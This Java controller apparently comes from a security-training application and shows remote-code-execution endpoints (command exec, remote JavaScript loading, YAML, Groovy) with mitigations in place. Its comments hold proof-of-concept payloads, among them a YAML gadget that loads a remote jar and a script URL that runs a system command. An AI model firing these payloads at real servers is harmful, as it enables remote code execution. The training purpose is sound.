package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.ast.expr.BinaryExpression;
import org.codehaus.groovy.ast.expr.ConstantExpression;
import org.codehaus.groovy.ast.expr.Expression;
import org.codehaus.groovy.ast.stmt.BlockStatement;
import org.codehaus.groovy.ast.stmt.ExpressionStatement;
import org.codehaus.groovy.ast.stmt.ReturnStatement;
import org.codehaus.groovy.ast.stmt.Statement;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.codehaus.groovy.syntax.Types;
import org.joychou.security.SecurityUtil;
import org.joychou.security.ssrf.SSRFChecker;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.math.BigDecimal;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;
import java.util.regex.Pattern;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Pattern JS_URL_PATTERN = Pattern.compile("^[a-zA-Z0-9:/._~?&=%-]+$");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        String[] argv = SecurityUtil.safeCmd(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = run.exec(argv);
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        String[] arrCmd = SecurityUtil.safeCmd(cmd);
        if (arrCmd == null) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // only allow scripts from allowlisted domains, and no characters that could break out of the string literal
        if (jsurl == null || !SSRFChecker.checkURLFckSSRF(jsurl) || !JS_URL_PATTERN.matcher(jsurl).matches()) {
            return;
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // SafeConstructor only builds standard YAML types, so arbitrary class tags are rejected.
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        // Restrict the script to plain arithmetic over numeric constants: no method calls,
        // property access, imports, closures or class definitions.
        SecureASTCustomizer secure = new SecureASTCustomizer();
        secure.setClosuresAllowed(false);
        secure.setMethodDefinitionAllowed(false);
        secure.setPackageAllowed(false);
        secure.setIndirectImportCheckEnabled(true);
        secure.setImportsWhitelist(Collections.<String>emptyList());
        secure.setStarImportsWhitelist(Collections.<String>emptyList());
        secure.setStaticImportsWhitelist(Collections.<String>emptyList());
        secure.setStaticStarImportsWhitelist(Collections.<String>emptyList());
        secure.setStatementsWhitelist(Arrays.<Class<? extends Statement>>asList(
                ExpressionStatement.class, ReturnStatement.class, BlockStatement.class));
        secure.setExpressionsWhitelist(Arrays.<Class<? extends Expression>>asList(
                BinaryExpression.class, ConstantExpression.class));
        secure.setTokensWhitelist(Arrays.asList(Types.PLUS, Types.MINUS, Types.MULTIPLY, Types.DIVIDE));
        secure.setConstantTypesClassesWhiteList(Arrays.<Class>asList(
                Integer.class, Integer.TYPE, Long.class, Long.TYPE, Double.class, Double.TYPE, BigDecimal.class));

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secure);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

